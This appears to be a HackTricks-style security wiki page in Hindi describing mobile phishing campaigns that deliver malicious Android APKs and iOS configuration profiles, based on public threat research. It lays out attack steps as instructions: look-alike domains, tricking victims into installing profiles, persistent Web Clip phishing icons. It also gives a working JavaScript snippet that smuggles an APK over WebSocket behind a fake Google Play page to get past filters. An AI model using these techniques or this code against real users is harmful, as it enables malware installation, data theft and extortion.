# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज उन तकनीकों के बारे में है जिनका इस्तेमाल threat actors phishing (SEO, social engineering, fake stores, dating apps आदि) के ज़रिए **malicious Android APKs** और **iOS mobile-configuration profiles** वितरित करने के लिए करते हैं।
> यह सामग्री Zimperium zLabs द्वारा उजागर किए गए SarangTrap campaign (2025) और अन्य सार्वजनिक शोधों से ली गई है।<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
   * मिलते-जुलते नाम वाले दर्जनों domains रजिस्टर करें (dating, cloud share, car service…)।  
     – Google में रैंक करने के लिए `<title>` element में स्थानीय भाषा के keywords और emojis का इस्तेमाल करें।  
     – एक ही landing page पर Android (`.apk`) और iOS install instructions, दोनों होस्ट करें।
2. **First Stage Download**
   * Android: *unsigned* या “third-party store” APK का direct link।  
   * iOS: malicious **mobileconfig** profile का `itms-services://` या सादा HTTPS link (नीचे देखें)।
3. **Android Post-install Behaviour**
   * C2-gated execution, permission abuse, dropper bypasses, background collection और अन्य post-install malware behaviour के बारे में नीचे दिए गए समर्पित Android Malware Post-Exploitation पेज पर बताया गया है।
4. **iOS Delivery Technique**
   * एक **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि का अनुरोध करके device को “MDM”-जैसी निगरानी में नामांकित कर सकता है।  
   * Social-engineering instructions:
     1. Settings ➜ *Profile downloaded* खोलें।
     2. *Install* पर तीन बार टैप करें (phishing page पर screenshots दिए गए हैं)।  
     3. Unsigned profile पर भरोसा करें ➜ हमलावर को App Store review के बिना *Contacts* और *Photo* entitlement मिल जाता है।
5. **iOS Web Clip Payload (phishing app icon)**
   * `com.apple.webClip.managed` payloads, ब्रांडेड icon/label के साथ phishing URL को **Home Screen पर पिन** कर सकते हैं।
   * Web Clips **full‑screen** में चल सकते हैं (browser UI छिप जाता है) और उन्हें **non-removable** के रूप में सेट किया जा सकता है, जिससे icon हटाने के लिए पीड़ित को profile delete करनी पड़ती है।<sup>[[3]](#references)</sup>
6. **Network Layer**
   * सादा HTTP, अक्सर port 80 पर और `api.<phishingdomain>.com` जैसे HOST header के साथ।
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS नहीं → आसानी से पहचाना जा सकता है)।

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS और persistence जैसी post-install Android malware tradecraft के लिए, देखें:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

हमलावर increasingly static APK links की जगह Google Play जैसे दिखने वाले lures में एम्बेड किए गए Socket.IO/WebSocket channel का इस्तेमाल कर रहे हैं। इससे payload URL छिप जाता है, URL/extension filters bypass होते हैं और install का अनुभव वास्तविक जैसा बना रहता है।<sup>[[2]](#references)[[4]](#references)</sup>

जंगल में देखा गया सामान्य client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

यह सरल controls से कैसे बचता है:
- कोई static APK URL उजागर नहीं होता; payload को WebSocket frames से memory में फिर से बनाया जाता है।
- सीधे .apk responses को block करने वाले URL/MIME/extension filters, WebSockets/Socket.IO के ज़रिए tunnel किए गए binary data को चूक सकते हैं।
- WebSockets execute न करने वाले crawlers और URL sandboxes payload retrieve नहीं करेंगे।

WebSocket tradecraft और tooling भी देखें:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [रोमांस का काला पक्ष: SarangTrap extortion campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple devices के लिए Web Clips payload settings](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [इंडोनेशियाई और वियतनामी Android users को निशाना बनाने वाला Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
